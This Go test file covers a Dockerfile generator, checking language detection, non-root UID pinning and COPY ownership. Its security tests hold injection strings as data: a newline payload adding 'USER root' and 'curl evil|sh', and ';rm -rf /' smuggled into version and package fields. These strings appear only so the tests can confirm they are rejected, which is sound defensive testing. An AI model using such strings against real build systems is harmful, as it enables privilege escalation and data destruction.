package builder

import (
	"os/exec"
	"strings"
	"testing"
)

func TestAutoDetect(t *testing.T) {
	cases := []struct {
		files map[string]bool
		want  string
	}{
		{map[string]bool{"go.mod": true}, "go"},
		{map[string]bool{"package.json": true}, "node"},
		{map[string]bool{"requirements.txt": true}, "python"},
		{map[string]bool{"pyproject.toml": true}, "python"},
		{map[string]bool{"Gemfile": true}, "ruby"},
		{map[string]bool{"composer.json": true}, "php"},
		{map[string]bool{"index.html": true}, "static"},
		// go wins over node when both are present (most specific service first).
		{map[string]bool{"go.mod": true, "package.json": true}, "go"},
	}
	for _, c := range cases {
		b, err := Resolve(Spec{Language: "auto"}, c.files)
		if err != nil {
			t.Errorf("%v: %v", c.files, err)
			continue
		}
		if b.Name() != c.want {
			t.Errorf("%v: want %s got %s", c.files, c.want, b.Name())
		}
	}
}

func TestAutoDetectFailsWithGuidance(t *testing.T) {
	_, err := Resolve(Spec{Language: "auto"}, map[string]bool{"README": true})
	if err == nil || !strings.Contains(err.Error(), "generic") {
		t.Errorf("undetectable repo must error pointing at generic, got %v", err)
	}
}

// build.dir scopes the COPY to the subdir; with no Dir the Dockerfile is unchanged.
func TestBuildDirScopesCopy(t *testing.T) {
	root, err := Generate(Spec{Language: "go"}, map[string]bool{"go.mod": true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(root, "COPY . .") {
		t.Errorf("default build should COPY . . (byte-identical):\n%s", root)
	}

	sub, err := Generate(Spec{Language: "go", Dir: "dns-resolver"}, map[string]bool{"go.mod": true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(sub, "COPY dns-resolver .") {
		t.Errorf("build.dir should scope the COPY to the subdir:\n%s", sub)
	}
	if strings.Contains(sub, "COPY . .") {
		t.Errorf("build.dir build must not COPY the repo root:\n%s", sub)
	}
	// The build-stage artifact copy is unaffected (it copies from the stage, not ctx).
	if !strings.Contains(sub, "COPY --from=build /out/app /app/app") {
		t.Errorf("build-stage copy should be untouched:\n%s", sub)
	}
}

func TestUnsupportedLanguage(t *testing.T) {
	if _, err := Resolve(Spec{Language: "cobol"}, nil); err == nil {
		t.Error("unsupported language must error")
	}
}

func TestNodeDockerfile(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Version: "20", Install: "npm ci", Build: "npm run build", Start: []string{"node", "dist/main"}, Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"FROM node:20-alpine AS build", "COPY package*.json ./", "RUN npm ci", "RUN npm run build", "RUN npm prune --omit=dev", "USER app", `CMD ["node", "dist/main"]`} {
		if !strings.Contains(df, want) {
			t.Errorf("node Dockerfile missing %q:\n%s", want, df)
		}
	}
}

// static with a build ships ONLY the output dir (not source + node_modules).
func TestStaticDockerfileShipsOutputDir(t *testing.T) {
	df, err := Generate(Spec{Language: "static", Build: "npm run build", Output: "dist"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(df, "COPY --from=build /app/dist /usr/share/nginx/html") {
		t.Errorf("static must serve only the output dir:\n%s", df)
	}
	// no build → serve the repo as-is
	df2, _ := Generate(Spec{Language: "static"}, nil)
	if !strings.Contains(df2, "COPY . /usr/share/nginx/html") {
		t.Errorf("static without build should serve the repo:\n%s", df2)
	}
}

func TestGoDockerfileDefaults(t *testing.T) {
	df, err := Generate(Spec{Language: "go", Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"golang:1.23-alpine AS build", "CGO_ENABLED=0 go build", "FROM alpine:3", `CMD ["/app/app"]`, "USER app"} {
		if !strings.Contains(df, want) {
			t.Errorf("go Dockerfile missing %q:\n%s", want, df)
		}
	}
}

func TestGenericRequiresBase(t *testing.T) {
	if _, err := Generate(Spec{Language: "generic", Start: []string{"./s"}}, nil); err == nil {
		t.Error("generic without base must error")
	}
	df, err := Generate(Spec{Language: "generic", Base: "ubuntu:24.04", Install: "make deps", Start: []string{"./bin/server"}, Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(df, "FROM ubuntu:24.04") || !strings.Contains(df, "RUN /bin/sh -c 'make deps' && ") {
		t.Errorf("generic Dockerfile wrong:\n%s", df)
	}
}

// SECURITY: an operator command containing a newline must be rejected so it cannot
// inject extra Dockerfile directives (e.g. a second FROM, USER root) — the Phase 1
// carry-forward.
func TestRejectsNewlineInjection(t *testing.T) {
	inj := "npm ci\nUSER root\nRUN curl evil|sh"
	if _, err := Generate(Spec{Language: "node", Install: inj, Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.install must be rejected (Dockerfile injection)")
	}
	if _, err := Generate(Spec{Language: "node", Build: "echo x\nFROM evil", Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.build must be rejected")
	}
	// also via build env values
	if _, err := Generate(Spec{Language: "node", Env: map[string]string{"K": "v\nUSER root"}, Start: []string{"x"}}, nil); err == nil {
		t.Error("a newline in build.env value must be rejected")
	}
}

func TestRejectsBadVersionAndPackages(t *testing.T) {
	if _, err := Generate(Spec{Language: "node", Version: "20; rm -rf /", Start: []string{"x"}}, nil); err == nil {
		t.Error("a bad version must be rejected")
	}
	if _, err := Generate(Spec{Language: "node", Packages: []string{"git; rm -rf /"}, Start: []string{"x"}}, nil); err == nil {
		t.Error("a bad package name must be rejected")
	}
}

// The non-root user must be pinned to an explicit high UID (10001), never the implicit `useradd -r`
// system UID that silently shifts when a package is added — the UID-drift fix.
func TestNonrootPinnedUID(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Version: "20", Start: []string{"node", "x"}, Nonroot: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(df, "10001") {
		t.Errorf("a non-root build must pin UID 10001, got:\n%s", df)
	}
	if strings.Contains(df, "useradd -r") || strings.Contains(df, "adduser -S") {
		t.Errorf("the implicit system-UID form must be gone:\n%s", df)
	}
	if !RunsAsNonroot(df) {
		t.Error("a build that emits USER app must report RunsAsNonroot=true")
	}
}

// A non-root Node image owns its runtime /app via `COPY --chown` in one layer, NOT a trailing
// `chown -R /app` — the latter copies-up the whole node_modules tree into a duplicate layer, which
// doubled image size and made a large deploy's chown + export (and so the deploy) crawl.
func TestNodeCopyChownNoRecursiveChown(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Version: "20", Start: []string{"node", "x"}, Nonroot: true}, map[string]bool{"package.json": true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(df, "COPY --chown=10001:10001 --from=build /app /app") {
		t.Errorf("non-root node runtime must own /app at copy time via COPY --chown, got:\n%s", df)
	}
	if strings.Contains(df, "chown -R") {
		t.Errorf("the wasteful trailing `chown -R /app` must be gone for node:\n%s", df)
	}
	if !strings.Contains(df, "adduser -D -H -u 10001 -G app app") || !RunsAsNonroot(df) {
		t.Errorf("the pinned non-root user + USER app must still be present:\n%s", df)
	}
	// Root image: no --chown flag, no non-root user.
	root, err := Generate(Spec{Language: "node", Version: "20", Start: []string{"node", "x"}, Nonroot: false}, map[string]bool{"package.json": true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(root, "COPY --from=build /app /app") || strings.Contains(root, "--chown") {
		t.Errorf("a root node image must copy /app with no --chown, got:\n%s", root)
	}
	if RunsAsNonroot(root) {
		t.Errorf("a root node image must not emit USER app:\n%s", root)
	}
}

func TestRunsAsNonroot(t *testing.T) {
	if !RunsAsNonroot("FROM alpine:3\nCOPY . .\nUSER app\n") {
		t.Error("a Dockerfile with USER app must be non-root")
	}
	if RunsAsNonroot("FROM php:8-apache\n# apache drops to www-data itself\n") {
		t.Error("a Dockerfile with no USER app (php) must be root")
	}
	if RunsAsNonroot("FROM x\nUSER appserver\n") {
		t.Error("USER appserver must not match the exact `USER app` directive")
	}
}

func TestNonrootOff(t *testing.T) {
	df, err := Generate(Spec{Language: "node", Start: []string{"node", "x"}, Nonroot: false}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(df, "USER app") {
		t.Errorf("nonroot=false must not add USER app:\n%s", df)
	}
}

func TestEnvValueNewlineFromDefinition(t *testing.T) {
	// Simulates a definition that passes schema.validateBuild but should fail at Generate
	if _, err := Generate(Spec{Language: "node", Env: map[string]string{"MYVAR": "value\nUSER root"}, Start: []string{"node", "x"}}, nil); err == nil {
		t.Error("a newline in build.env value must be rejected (not validated at definition parse time)")
	}
}

// No generated non-root image ends with a `chown -R /app` (it copies every earlier file into a second layer,
// doubling the image). The source is owned at COPY time and each install/build step owns what it created
// in its own layer, so /app still ends up entirely owned by the pinned UID.
func TestNonrootBuildersOwnAppWithoutAChownLayer(t *testing.T) {
	const owned = " && find /app ! -user 10001 -exec chown -h 10001:10001 {} +"
	cases := map[string]struct {
		spec  Spec
		files map[string]bool
		want  []string
	}{
		"python": {Spec{Language: "python", Start: []string{"python", "app.py"}, Build: "python manage.py collectstatic --noinput", Nonroot: true}, map[string]bool{"requirements.txt": true},
			[]string{"COPY --chown=10001:10001 . .", "RUN /bin/sh -c 'pip install --no-cache-dir -r requirements.txt'" + owned, "RUN /bin/sh -c 'python manage.py collectstatic --noinput'" + owned}},
		"ruby": {Spec{Language: "ruby", Start: []string{"bundle", "exec", "puma"}, Nonroot: true}, map[string]bool{"Gemfile": true, "Gemfile.lock": true},
			[]string{"COPY --chown=10001:10001 . .", owned}},
		"generic": {Spec{Language: "generic", Base: "debian:12-slim", Install: "make deps", Build: "make", Start: []string{"./bin/server"}, Nonroot: true}, nil,
			[]string{"COPY --chown=10001:10001 . .", "RUN /bin/sh -c 'make deps'" + owned, "RUN /bin/sh -c 'make'" + owned}},
		"python, blank install": {Spec{Language: "python", Install: "   ", Start: []string{"python", "app.py"}, Nonroot: true}, map[string]bool{"requirements.txt": true},
			[]string{"COPY --chown=10001:10001 . .", "RUN chown 10001:10001 /app"}},
		"generic, no steps": {Spec{Language: "generic", Base: "debian:12-slim", Start: []string{"./bin/server"}, Nonroot: true}, nil,
			[]string{"COPY --chown=10001:10001 . .", "RUN chown 10001:10001 /app"}},
		"go": {Spec{Language: "go", Start: []string{"/app/app"}, Nonroot: true}, map[string]bool{"go.mod": true},
			[]string{"RUN apk add --no-cache ca-certificates && chown 10001:10001 /app", "COPY --from=build --chown=10001:10001 /out/app /app/app"}},
	}
	for name, c := range cases {
		df, err := Generate(c.spec, c.files)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if strings.Contains(df, "chown -R") {
			t.Errorf("%s: a trailing `chown -R` doubles the image:\n%s", name, df)
		}
		for _, w := range c.want {
			if !strings.Contains(df, w) {
				t.Errorf("%s: missing %q:\n%s", name, w, df)
			}
		}
		if !RunsAsNonroot(df) {
			t.Errorf("%s: must still run as the pinned user:\n%s", name, df)
		}
	}
	// A root image is unchanged: no ownership steps at all.
	df, err := Generate(Spec{Language: "generic", Base: "debian:12-slim", Install: "make deps", Start: []string{"./bin/server"}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(df, "10001") || !strings.Contains(df, "RUN make deps") {
		t.Errorf("a root image must have no ownership steps:\n%s", df)
	}
}

// A non-root step runs exactly the operator's command — comments, quotes, arithmetic and all — and the
// ownership step runs only after it succeeds. Checked with a real /bin/sh, the ownership step swapped for a
// marker.
func TestRunOwnedKeepsTheStepIntact(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh")
	}
	const owned = " && find /app ! -user 10001 -exec chown -h 10001:10001 {} +"
	cases := []struct {
		cmd  string
		want string
		ok   bool
	}{
		{"echo hi # fetch deps", "hi\nOWNED\n", true},
		{`printf '%s\n' "it's" $((1+1))`, "it's\n2\nOWNED\n", true},
		{"echo a; echo b", "a\nb\nOWNED\n", true},
		{"false # nothing", "", false},
		{"echo (", "", false},
	}
	for _, c := range cases {
		line := strings.TrimPrefix(runOwned(true, c.cmd), "RUN ")
		if !strings.HasSuffix(line, owned) {
			t.Fatalf("%q: ownership step missing: %s", c.cmd, line)
		}
		out, err := exec.Command("sh", "-c", strings.TrimSuffix(line, owned)+" && echo OWNED").Output()
		if (err == nil) != c.ok || string(out) != c.want {
			t.Errorf("%q: got %q (err %v), want %q ok=%v", c.cmd, out, err, c.want, c.ok)
		}
	}
}
